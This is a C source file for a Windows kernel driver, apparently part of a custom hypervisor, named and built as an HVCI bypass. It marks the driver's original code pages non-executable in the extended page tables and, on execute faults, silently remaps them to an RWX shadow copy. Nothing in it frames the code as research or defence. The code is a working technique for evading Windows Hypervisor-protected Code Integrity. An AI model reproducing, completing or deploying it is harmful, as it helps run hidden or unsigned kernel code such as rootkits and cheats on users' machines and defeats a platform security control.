#include "hvci_bypass.h"
#include "hypervisor.h"

static PVOID g_DriverTextStart = NULL;
static ULONG g_DriverTextSize = 0;
static PVOID g_ShadowText = NULL;
static UINT64 g_TextPhysBase = 0;

// Manejador real de violaci?n de ejecuci?n
BOOLEAN HandleHvciExecuteViolation(UINT64 GuestPhysAddr, UINT64 GuestRip) {
    if (!g_DriverTextStart || !g_ShadowText) return FALSE;
    UINT64 base = g_TextPhysBase;
    if (GuestPhysAddr >= base && GuestPhysAddr < base + g_DriverTextSize) {
        ULONG offset = (ULONG)(GuestPhysAddr - base);
        UINT64 shadowPhys = MmGetPhysicalAddress((PUCHAR)g_ShadowText + offset).QuadPart & ~0xFFFULL;
        PUINT64 pte = NULL;
        int retries = 0;
        while (!pte && retries < 10) {
            pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, GuestPhysAddr);
            retries++;
        }
        if (!pte) return FALSE;
        *pte = (shadowPhys & ~0xFFFULL) | 7; // presente, RWX
        UINT64 desc[2] = { g_Vmx.EptPml4Phys, 0 };
        InvEpt(1, desc);
        // Schedule MTF to restore after instruction
        SetMTF();
        return TRUE;
    }
    return FALSE;
}

NTSTATUS InitHvciBypass() {
    if (!g_Vmx.HypervisorActive) return STATUS_NOT_SUPPORTED;
    PDRIVER_OBJECT driver = g_DeviceObject->DriverObject;
    g_DriverTextStart = driver->DriverStart;
    g_DriverTextSize = driver->DriverSize;
    if (!g_DriverTextStart || !g_DriverTextSize) return STATUS_UNSUCCESSFUL;

    // Reservar p?gina sombra para el c?digo
    g_ShadowText = ExAllocatePoolWithTag(NonPagedPool, g_DriverTextSize, 'txSh');
    if (!g_ShadowText) return STATUS_INSUFFICIENT_RESOURCES;
    RtlCopyMemory(g_ShadowText, g_DriverTextStart, g_DriverTextSize);

    // Marcar las p?ginas originales como no ejecutables en la EPT
    g_TextPhysBase = MmGetPhysicalAddress(g_DriverTextStart).QuadPart & ~0xFFFULL;
    for (ULONG offset = 0; offset < g_DriverTextSize; offset += PAGE_SIZE) {
        UINT64 physAddr = g_TextPhysBase + offset;
        PUINT64 pte = NULL;
        int retries = 0;
        while (!pte && retries < 10) {
            pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr);
            retries++;
        }
        if (pte) {
            *pte &= ~4ULL; // quitar bit de ejecuci?n
        }
    }
    UINT64 desc[2] = { g_Vmx.EptPml4Phys, 0 };
    InvEpt(1, desc);
    return STATUS_SUCCESS;
}

VOID CleanupHvciBypass() {
    if (g_ShadowText) {
        ExFreePoolWithTag(g_ShadowText, 'txSh');
        g_ShadowText = NULL;
    }
    // Restaurar bits de ejecuci?n
    if (g_TextPhysBase && g_Vmx.HypervisorActive) {
        for (ULONG offset = 0; offset < g_DriverTextSize; offset += PAGE_SIZE) {
            UINT64 physAddr = g_TextPhysBase + offset;
            PUINT64 pte = NULL;
            int retries = 0;
            while (!pte && retries < 10) {
                pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr);
                retries++;
            }
            if (pte) *pte |= 4ULL;
        }
        UINT64 desc[2] = { g_Vmx.EptPml4Phys, 0 };
        InvEpt(1, desc);
    }
}
